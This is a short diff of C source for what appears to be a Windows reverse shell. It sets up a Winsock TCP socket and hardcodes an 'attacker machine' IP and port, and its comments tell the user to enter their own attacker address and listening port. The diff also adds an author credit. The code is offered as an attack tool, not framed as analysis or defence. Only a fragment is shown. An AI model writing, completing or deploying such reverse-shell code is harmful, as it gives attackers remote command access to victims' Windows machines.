@@ -1,3 +1,4 @@
+// Coded by AnonCodernymous
 #include <winsock2.h>
 #include <stdio.h>
 #include <windows.h>
@@ -25,8 +26,8 @@ int main()
 	PROCESS_INFORMATION pi;
 	int connection;
 	char RecvServer[512];
-	char ip[] = "192.168.40.128";		//	IP Address of the attacker machine
-	int port = 8888;
+	char ip[] = "127.0.0.1";		//	Enter your attacker machine Ip address
+	int port = 8888;			//Enter a port to listen to
 	
 	WSAStartup(MAKEWORD(2,2), &wsa);	//Initialize of Winsock
 	shell = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);		//Creation of TCP Socket
